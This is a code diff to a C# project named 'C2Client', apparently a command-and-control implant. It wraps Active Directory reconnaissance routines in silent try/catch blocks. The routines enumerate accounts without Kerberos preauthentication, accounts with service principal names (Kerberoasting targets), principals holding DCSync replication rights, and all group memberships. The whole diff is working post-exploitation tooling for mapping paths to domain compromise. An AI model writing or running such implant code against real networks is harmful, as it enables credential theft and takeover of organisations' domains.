@@ -191,42 +191,43 @@ namespace C2Client
                     }
 
                     StringWriter sw = new StringWriter();
-
-                    // DC=tech69,DC=local,DC=net 
-                    DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
-                    DirectorySearcher ds = new DirectorySearcher();
-                    ds.SearchRoot = de;
-                    ds.Filter = "(&(objectclass=user)(useraccountcontrol>=4194304))";
-                    foreach (SearchResult sr in ds.FindAll())
+                    try
                     {
-                        sw.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], domainName);
-                        sw.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
-                        int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
-                        string uac_binary = Convert.ToString(uac, 2);
-                        List<string> flags = new List<string>();
-                        //Console.WriteLine(l.Count);
-                        //Console.WriteLine(uac_binary.Length);
-                        for (int i = 0; i < uac_binary.Length; i++)
+                        // DC=tech69,DC=local,DC=net 
+                        DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
+                        DirectorySearcher ds = new DirectorySearcher();
+                        ds.SearchRoot = de;
+                        ds.Filter = "(&(objectclass=user)(useraccountcontrol>=4194304))";
+                        foreach (SearchResult sr in ds.FindAll())
                         {
-                            int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
-                            if (result2 != 0)
+                            sw.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], domainName);
+                            sw.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
+                            int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
+                            string uac_binary = Convert.ToString(uac, 2);
+                            List<string> flags = new List<string>();
+                            //Console.WriteLine(l.Count);
+                            //Console.WriteLine(uac_binary.Length);
+                            for (int i = 0; i < uac_binary.Length; i++)
                             {
-                                //Console.WriteLine(l[i]);
-                                flags.Add(l[i]);
+                                int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
+                                if (result2 != 0)
+                                {
+                                    //Console.WriteLine(l[i]);
+                                    flags.Add(l[i]);
+                                }
+
                             }
+                            foreach (string temp in flags)
+                            {
+                                sw.WriteLine(temp);
+                            }
+                            sw.WriteLine();
 
                         }
-                        foreach (string temp in flags)
-                        {
-                            sw.WriteLine(temp);
-                        }
-                        sw.WriteLine();
 
+                        result += sw.ToString();
                     }
-
-                    result += sw.ToString();
-
-
+                    catch { }
                 }
                 Console.WriteLine("Result is-->{0}<--", result);
                 if (result == "")
@@ -263,20 +264,24 @@ namespace C2Client
 
                     StringWriter sw = new StringWriter();
 
-                    // DC=tech69,DC=local,DC=net 
-                    DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
-                    DirectorySearcher ds = new DirectorySearcher();
-                    ds.SearchRoot = de;
-                    ds.Filter = "(&(objectclass=user)(serviceprincipalname=*))";
-
-                    foreach(SearchResult sr in ds.FindAll())
+                    try
                     {
-                        sw.WriteLine("Sam Account Name: {0}", sr.Properties["samaccountname"][0]);
-                        sw.WriteLine("Service Principal Name: {0}", sr.Properties["serviceprincipalname"][0]);
-                        sw.WriteLine();
-                    }
+                        // DC=tech69,DC=local,DC=net 
+                        DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
+                        DirectorySearcher ds = new DirectorySearcher();
+                        ds.SearchRoot = de;
+                        ds.Filter = "(&(objectclass=user)(serviceprincipalname=*))";
 
-                    result += sw.ToString();
+                        foreach (SearchResult sr in ds.FindAll())
+                        {
+                            sw.WriteLine("Sam Account Name: {0}", sr.Properties["samaccountname"][0]);
+                            sw.WriteLine("Service Principal Name: {0}", sr.Properties["serviceprincipalname"][0]);
+                            sw.WriteLine();
+                        }
+
+                        result += sw.ToString();
+                    }
+                    catch { }
                 }
                 if (result == "")
                 {
@@ -345,7 +350,7 @@ namespace C2Client
 
         public string GetDCSyncUsers(string domainDN)
         {
-            string result;
+            string result="";
             Console.WriteLine(domainDN);
             StringWriter sw = new StringWriter();
             sw.WriteLine("-------- DOMAIN: {0} ---------", domainDN);
@@ -357,41 +362,46 @@ namespace C2Client
             ht.Add("DS-Replication-Monitor-Topology", "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96");
             ht.Add("DS-Replication-Synchronize", "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2");
 
-            DirectoryEntry de = new DirectoryEntry("LDAP://" + domainDN);
-            DirectorySearcher ds = new DirectorySearcher();
-            ds.SearchRoot = de;
-
-            foreach (SearchResult sr in ds.FindAll())
+            try
             {
-                try
+                DirectoryEntry de = new DirectoryEntry("LDAP://" + domainDN);
+                DirectorySearcher ds = new DirectorySearcher();
+                ds.SearchRoot = de;
+
+                foreach (SearchResult sr in ds.FindAll())
                 {
-                    DirectoryEntry temp = sr.GetDirectoryEntry();
-                    AuthorizationRuleCollection arc = temp.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));
-
-                    foreach (ActiveDirectoryAccessRule a in arc)
+                    try
                     {
-                        if (domainDN.Contains(temp.Name.ToString()))
+                        DirectoryEntry temp = sr.GetDirectoryEntry();
+                        AuthorizationRuleCollection arc = temp.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));
+
+                        foreach (ActiveDirectoryAccessRule a in arc)
                         {
-
-                            foreach (DictionaryEntry d in ht)
+                            if (domainDN.Contains(temp.Name.ToString()))
                             {
-                                if (d.Value.ToString() == a.ObjectType.ToString())
-                                {
-                                    sw.WriteLine(a.IdentityReference);
-                                    sw.WriteLine(d.Key.ToString());
-                                    sw.WriteLine(a.ObjectType);
-                                    //sw.WriteLine(a.AccessControlType);
-                                    //sw.WriteLine(a.ActiveDirectoryRights);
 
-                                    sw.WriteLine();
+                                foreach (DictionaryEntry d in ht)
+                                {
+                                    if (d.Value.ToString() == a.ObjectType.ToString())
+                                    {
+                                        sw.WriteLine(a.IdentityReference);
+                                        sw.WriteLine(d.Key.ToString());
+                                        sw.WriteLine(a.ObjectType);
+                                        //sw.WriteLine(a.AccessControlType);
+                                        //sw.WriteLine(a.ActiveDirectoryRights);
+
+                                        sw.WriteLine();
+                                    }
                                 }
                             }
                         }
                     }
+                    catch { }
                 }
-                catch { }
+                result = sw.ToString();
+                return result;
             }
-            result = sw.ToString();
+            catch { }
             return result;
         }
 
@@ -585,21 +595,24 @@ namespace C2Client
                                 dcs[i] = "DC=" + dcs[i];
 
                             }
-                            DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
-                            DirectorySearcher ds = new DirectorySearcher();
-                            ds.SearchRoot = de;
-                            ds.Filter = "(objectclass=group)";
-
-                            sw.WriteLine("-----Domain: {0}-----", domainName);
-                            foreach (SearchResult sr in ds.FindAll())
+                            try
                             {
-                                sw.WriteLine("------{0}------", sr.Properties["samaccountname"][0]);
-                                Thread groups = new Thread(() => { sw = p.GetAllMembers(sr.Properties["samaccountname"][0].ToString(), domainName, sw); });
-                                groups.Start();
-                                groups.Join();
-                                sw.WriteLine();
-                            }
+                                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
+                                DirectorySearcher ds = new DirectorySearcher();
+                                ds.SearchRoot = de;
+                                ds.Filter = "(objectclass=group)";
 
+                                sw.WriteLine("-----Domain: {0}-----", domainName);
+                                foreach (SearchResult sr in ds.FindAll())
+                                {
+                                    sw.WriteLine("------{0}------", sr.Properties["samaccountname"][0]);
+                                    Thread groups = new Thread(() => { sw = p.GetAllMembers(sr.Properties["samaccountname"][0].ToString(), domainName, sw); });
+                                    groups.Start();
+                                    groups.Join();
+                                    sw.WriteLine();
+                                }
+                            }
+                            catch { }
                         }
 
                         //Thread groups = new Thread(() => { sw = p.GetAllMembers("Domain Admins", d.Name, sw); });
@@ -644,14 +657,16 @@ namespace C2Client
                             }
 
                             string domainDN = String.Join(",", dcs);
+                            try
+                            {
+                                Program p = new Program();
+                                Thread dcsync = new Thread(() => { cmd += p.GetDCSyncUsers(domainDN); });
+                                dcsync.Name = "get-dcsyncusers";
+                                dcsync.Start();
+                                dcsync.Join();
 
-                            Program p = new Program();
-                            Thread dcsync = new Thread(() => { cmd += p.GetDCSyncUsers(domainDN); });
-                            dcsync.Name = "get-dcsyncusers";
-                            dcsync.Start();
-                            dcsync.Join();
-
-                            
+                            }
+                            catch { }
 
 
                         }
